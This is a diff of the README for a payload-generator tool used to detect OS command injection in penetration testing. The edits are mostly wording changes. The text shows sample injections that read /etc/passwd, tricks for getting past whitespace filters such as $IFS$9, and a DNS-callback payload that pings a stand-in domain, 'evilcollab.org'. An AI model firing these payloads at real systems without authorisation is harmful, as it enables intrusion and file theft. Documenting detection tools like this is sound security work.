@@ -6,8 +6,8 @@ Original work by: Julian H. https://github.com/ewilded/shelling
 This script is a customizable payload generator intended for detecting OS command injection flaws during dynamic testing, usually conducted with no access to the source code or the filesystem.  Creation of SUCCESSFUL payloads in this kind of assessments requires a lot of guesswork, especially:
 - the eventual syntax of the expression we are injecting into (e.g. quoted expressions)
 - input sanitizing mechanisms rejecting individual characters (e.g. spaces)
-- platform specific conditions (e.g. there is no "sleep" on windows)
-- the callback method (e.g. asynchronous execution, no outbound traffic allowed)
+- platform-specific conditions (e.g. there is no "sleep" on windows)
+- callback method (e.g. asynchronous execution, no outbound traffic allowed)
 
 The purpose of creating this tool was to reach the non-trivial OS command injection cases, which stay undetected by generally known and used tools and sets of payloads. 
 
@@ -67,11 +67,11 @@ Double quotes:
 - `“COMMAND_SEPARATOR+ FULL_COMMAND +COMMAND_SEPARATOR”`
 
 
-### The problem of input sanitizing mechanisms
+### The problem of input-sanitizing mechanisms
 
 #### Bad characters
-As it is generally known, blacklisting is not a good approach in security. In most cases, sooner or later the attackers find another way of achieving their goal by finding a way around it.
-Many input sanitizing functions attempt to catch all potentially dangerous characters which might give an attacker a way to control the target expression.
+As it is generally known, blacklisting is not a good approach in security. In most cases, sooner or later the attackers find a way around it.
+Many input-sanitizing functions attempt to catch all potentially dangerous characters which might give an attacker a way to control the target expression.
 
 Let's consider the following example:
 
@@ -84,7 +84,6 @@ Let's consider the following example:
 
 
 The script executes the OS command only if the user-supplied variable does not contain any white characters (like spaces or tabs). This is why payloads like:
-
 `cat /etc/passwd`
 `;cat /etc/passwd;`
 `';cat /etc/passwd;'`
@@ -104,7 +103,7 @@ Currently supported alternative argument separators are for unix are:
 - `%20` - space
 - `%09` - horizontal tab
 - `$IFS$9` - IFS terminated with 9-nth - usually empty - argument holder).
-The above is just an example of bypassing poorly written input sanitizing function from the perspective of alternative argument separators. 
+The above is just an example of bypassing poorly written input-sanitizing function from the perspective of alternative argument separators. 
 
 Other options include filters on command separators (not to confuse with argument separators), which are in most cases required to inject arbitrary commands. The list of tested command separators:
 
@@ -215,7 +214,8 @@ The `PAYLOAD_MARK` holder is either removed - or replaced with a unique payload 
 - `$COMMAND='ping'`, `$ARGUMENT='PAYLOAD_MARK.sub.evilcollab.org'` - this will generate commands like `ping$IFS$966.sub.evilcollab.org`. So, if this particular payload is successful, the nameserver responsible for serving the `*.sub.evilcollab.org` entries will receive a query to `66.sub.evilcollab.org` - so we know that the 66-th payload defeated the sanitizer.
 - `$COMMAND='touch'`, `$ARGUMENT='/tmp/fooPAYLOAD_MARK'` - this will generate commands like `touch$IFS$9/tmp/foo132` - so if a file /tmp/foo132 is created, we know that the 132-th payload did the trick.
 
-The tool can be used for detection directly - or in a hybrid approach, after identifying suspicious behaviours with Backslash Powered Scanner Burp Plugin.
+The tool can be used for detection directly - or in a hybrid approach, after identifying suspicious behaviours with Baskslash-powered Scanner Burp Plugin.
+
 
 ### Case examples
 #### 1) See the test_cases directory 
